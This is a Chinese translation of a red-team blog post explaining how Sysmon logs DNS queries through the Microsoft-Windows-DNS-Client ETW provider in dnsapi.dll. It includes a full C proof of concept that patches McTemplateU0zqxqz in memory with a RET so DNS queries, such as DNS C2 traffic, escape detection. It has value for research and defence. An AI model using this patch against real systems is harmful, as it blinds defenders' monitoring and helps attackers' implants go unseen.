> 原文链接: https://www.anquanke.com//post/id/180418 


# 如何规避Sysmon DNS监控


                                阅读量   
                                **315191**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者xpnsec，文章来源：blog.xpnsec.com
                                <br>原文地址：[https://blog.xpnsec.com/evading-sysmon-dns-monitoring/](https://blog.xpnsec.com/evading-sysmon-dns-monitoring/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t012beadefb4914fbe2.jpg)](https://p4.ssl.qhimg.com/t012beadefb4914fbe2.jpg)



## 0x00 前言

[Sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)在最近更新中添加了一个功能，可以记录DNS事件。这一点对防御方非常有用（呼吁SysInternals团队继续免费添加并提供这类工具），但对攻击方而言，这意味着如果我们的植入后门或者payload尝试通过DNS进行通信，那么蓝队就有可能搜集到相关特征，用来检测攻击行为。

容易受该功能影响的一种场景就是基于DNS的C2通信，其中大量请求会被记录下来，可能导致出师未捷身先死。在某次测试过程中，目标环境中部署了这种机制，因此我想花一点时间了解如何规避这种检测机制。在本文中，我将与大家分享规避Sysmon 10.1的一种方法。

在规避Sysmon之前，我们首先需要搭建测试环境。这里我使用[sysmon-config](https://github.com/SwiftOnSecurity/sysmon-config)来安装Sysmon，命令如下：

```
sysmon.exe -accepteula -i rules.xml
```

测试环境搭建完毕并正常运行后，我们可以看到有源源不断的事件被记录下来。过滤Event ID 22，我们可以重点关注“DNS query”（DNS请求）事件，如下所示：

[![](https://p4.ssl.qhimg.com/t01684bb043bdce0f7f.png)](https://p4.ssl.qhimg.com/t01684bb043bdce0f7f.png)

一切准备就绪后，我们可以看下查询请求被记录的原理。



## 0x01 DNS日志审计原理

为了澄清在规避时可以使用哪些选项，我首先想了解一下底层工作原理。根据其他参考资料，我们知道Sysmon会大量依赖ETW来监控各种行为（比如网络连接）。因此DNS监控很有可能也采用相同方式。如果我们使用如下命令，就能找到第一条线索，表明ETW的确是关键点：

```
logman -ets
```

[![](https://p5.ssl.qhimg.com/t01d97eb6da71c739a0.png)](https://p5.ssl.qhimg.com/t01d97eb6da71c739a0.png)

安装Sysmon后，我注意到上图的“Data Collector Set”包含一个“My Event Trace Session”。如果我们进一步分析这个点，可以看到这个数据收集器很有可能负责将DNS数据提供给Sysmon。

[![](https://p5.ssl.qhimg.com/t01fb50363bfcb08a16.png)](https://p5.ssl.qhimg.com/t01fb50363bfcb08a16.png)

继续搜索后，我们可以在各种位置通过`Microsoft-Windows-DNS-Client`这个事件源来获取关于DNS查询的一些信息。但在使用这种方法之前，我通常喜欢通过对应服务来交叉验证这一点，因此这里我们可以试一下Ghidra。在Ghidra中搜索“My Event Trace Session”后，我们找到了如下函数：

[![](https://p0.ssl.qhimg.com/t016f5c4079c99770e9.png)](https://p0.ssl.qhimg.com/t016f5c4079c99770e9.png)

我们在`SysMon64.exe`中找到了这个函数，其中引用了这个特征（备注：这个函数以及名称与微软[官方文档](https://docs.microsoft.com/en-us/windows/desktop/etw/example-that-creates-a-session-and-enables-a-manifest-based-provider)中提供的示例代码非常相似）。在上图中，传递给`EnableTraceEx2`的第2个参数指向的是如下数据：

[![](https://p4.ssl.qhimg.com/t0102d6fc773e101077.png)](https://p4.ssl.qhimg.com/t0102d6fc773e101077.png)

这显然与`logman`输出结果中`Microsoft-Windows-DNS-Client`的GUID相同（``{`1C95126E-7EEa-49A9-A3FE-A378B03DDB4D`}``）。因此现在我们可以肯定这正是该工具记录DNS查询的方法。接下来，我们需要澄清发起DNS请求时这些日志如何被触发。



## 0x02 触发相关日志

这里我们试一下常用的DNS API：`DnsQuery_A`，利用这个API来找到相关ETW数据可能出现的位置。我们显然可以从`dnsapi.dll`中开始寻找，这也是托管该API的服务程序。将该DLL及对应的PDB载入Ghidra中，我们可以开始查找与ETW有关的一些功能。由于我们已经知道与DNS事件相关的一个GUID，因此可以使用这个特征来寻找出发点。令人惊讶的是，我们的确在DLL中找到了这个GUID，对应的是`DNS_CLIENT`符号：

[![](https://p5.ssl.qhimg.com/t01651a423daf58ff20.png)](https://p5.ssl.qhimg.com/t01651a423daf58ff20.png)

如果我们继续跟进，可知`McGenEventRegister`函数中引用到了`DNS_CLIENT`：

[![](https://p2.ssl.qhimg.com/t01a13533783b6c6944.png)](https://p2.ssl.qhimg.com/t01a13533783b6c6944.png)

`DllMain`中会调用该函数，这意味着系统会创建一个句柄（`DNS_CLIENT_Context`），用来发送相关事件。

为了了解整个DLL中如何使用这个句柄，我们可以创建一个小程序，功能很简单，就是发起DNS查询：

```
#include &lt;Windows.h&gt;
#include &lt;WinDNS.h&gt;

int main()
`{`
    DnsQuery_A("blog.xpnsec.com", DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, NULL, NULL);
`}`
```

如果编译该程序并在WinDBG中分析，我们可以添加一个断点，在内存读取`DNS_CLIENT_Context`时触发该断点，命令如下：

```
ba r4 DNSAPI!DNS_CLIENT_Context
```

恢复应用执行后，断点很快就被触发，可以找到如下调用栈：

[![](https://p2.ssl.qhimg.com/t01225a506ac2fa1363.png)](https://p2.ssl.qhimg.com/t01225a506ac2fa1363.png)

而我们对应的指令如下：

[![](https://p5.ssl.qhimg.com/t017c32a6128280a006.png)](https://p5.ssl.qhimg.com/t017c32a6128280a006.png)

这些信息意味着`DnsApi.dll`内部会向`Microsoft-Windows-DNS-Client`发送事件，这个DLL会加载到攻击者进程中，而该进程我们正好可以控制。



## 0x03 规避方法

现在我们知道这些事件会从`DnsApi.dll`内部发出，并且由于该DLL会在我们可控的进程内调用，因此我们可以影响这个过程。这也是我们可以考虑进行patch的一个点。

如何完成这个任务有各种方法，大家可以自己选择。在PoC中，我们选择在运行时patch `DNSAPI!McTemplateU0zqxqz`，使其不通过`EtwEventWriteTransfer`发送相关事件，直接返回。大家可以参考如下代码：

```
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;
#include &lt;WinDNS.h&gt;

// Pattern for hunting dnsapi!McTemplateU0zqxqz
#define PATTERN (unsigned char*)"x48x89x5cx24x08x44x89x4cx24x20x55x48x8dx6c"
#define PATTERN_LEN 14

// Search for pattern in memory
DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen) `{`
    ULONG offset = 0;

    for (int i = 0; i &lt; 0x200000; i++) `{`
        if (*(unsigned char*)(mem + i) == signature[0] &amp;&amp; *(unsigned char*)(mem + i + 1) == signature[1]) `{`
            if (memcmp(mem + i, signature, signatureLen) == 0) `{`
                // Found the signature
                offset = i;
                break;
            `}`
        `}`
    `}`

    return offset;
`}`

int main()
`{`
    DWORD oldProtect, oldOldProtect;

    printf("DNS Sysmon Bypass POCn      by @_xpn_nn");

    unsigned char *dll = (unsigned char *)LoadLibraryA("dnsapi.dll");
    if (dll == (void*)0) `{`
        printf("[x] Could not load dnsapi.dlln");
        return 1;
    `}`

    DWORD patternOffset = SearchPattern(dll, PATTERN, PATTERN_LEN);
    printf("[*] Pattern found at offset %dn", patternOffset);

    printf("[*] Patching with RETn");
    VirtualProtect(dll + patternOffset, 10, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
    *(dll + patternOffset) = 0xc3;
    VirtualProtect(dll, 10, oldProtect, &amp;oldOldProtect);

    printf("[*] Sending DNS Query... should now not be detectedn");
    DnsQuery_A("blog.xpnsec.com", DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, NULL, NULL);

`}`
```

成功patch后，如果我们在程序中发起DNS查询请求，可以在不触发任何事件情况下，调用DNS客户端API。整个过程参考[此处视频](https://youtu.be/km4vXyi2l84)。



## 0x04 总结

本文给出了规避这种监控机制可以采用的一种方法，深入了解内部工作原理后，希望大家在将来遇到这类日志审计机制时，能够采用类似方法定制payload，成功规避相关事件。

没有任何机制是百分百有效且安全的，如果蓝队小伙伴们想知道自己是否有必要部署这种技术（或者类似技术），可以考虑攻击者在规避这种技术时需要采用的其他方法，考虑后再做决策。
